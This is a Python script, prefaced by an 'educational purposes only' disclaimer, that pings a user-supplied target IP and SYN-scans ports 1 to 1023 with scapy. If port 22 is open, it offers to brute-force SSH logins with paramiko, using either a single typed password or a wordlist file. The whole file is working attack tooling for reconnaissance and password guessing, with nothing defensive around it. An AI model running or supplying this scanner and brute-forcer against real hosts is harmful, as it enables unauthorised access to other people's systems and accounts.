"""
This code is for educational purposes only.
Do not use it for any illegal or unethical activities.
"""

from scapy.all import *
import paramiko
from tqdm import tqdm


target = input("Enter target IP: ")
registered_ports = range(1, 1024)
open_ports = []



def is_target_available():
    try:
        conf.verb = 0
        icmp = sr1(IP(dst=target) / ICMP(), timeout=3)
        if icmp:
            return True
    except Exception as e:
        print(e)
        return False


# Funkcja skanowania portu
def scanport(port):
    source_port = RandShort()
    conf.verb = 0
    synpkt = sr1(IP(dst=target) / TCP(sport=source_port, dport=port, flags="S"), timeout=0.5)

    if not synpkt:
        return False
    if not synpkt.haslayer(TCP):
        return False
    if synpkt.getlayer(TCP).flags == 0x12:
        sr(IP(dst=target) / TCP(sport=source_port, dport=port, flags="R"), timeout=2)
        return True
    return False


#  brute-force
def brute_force(port):
    choice = input("Do you want to (1) enter a password manually or (2) use a password file? Enter 1 or 2: ")

    user = input("Enter SSH username: ")
    sshconn = paramiko.SSHClient()
    sshconn.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    if choice == "1":
        password = input("Enter password to try: ")
        try:
            sshconn.connect(target, port=int(port), username=user, password=password, timeout=1)
            print(f"Success! Password is: {password}")
        except Exception:
            print(f"Password '{password}' failed.")
        sshconn.close()

    elif choice == "2":
        try:
            with open("PasswordList.txt", "r") as file:
                passwords = [line.strip() for line in file.readlines()]
                for password in passwords:
                    try:
                        sshconn.connect(target, port=int(port), username=user, password=password, timeout=1)
                        print(f"Success! Password found: {password}")
                        sshconn.close()
                        break
                    except Exception:
                        print(f"{password} failed.")
        except FileNotFoundError:
            print("PasswordList.txt not found!")



if is_target_available():
    print(f"Target {target} is available. Scanning ports...")

    for port in tqdm(registered_ports, desc="Scanning Ports", unit="port"):
        status = scanport(port)
        if status:
            open_ports.append(port)
            print(f"\n[+] Port {port} is open.")

    print("\nFinished scanning.")

    if 22 in open_ports:
        print("Port 22 is open.")
        print("Open ports:", open_ports)
        response = input("Do you want to perform a brute-force attack on port 22? (y/n): ")
        if response.lower() == "y":
            brute_force(22)
else:
    print(f"Target {target} is not reachable.")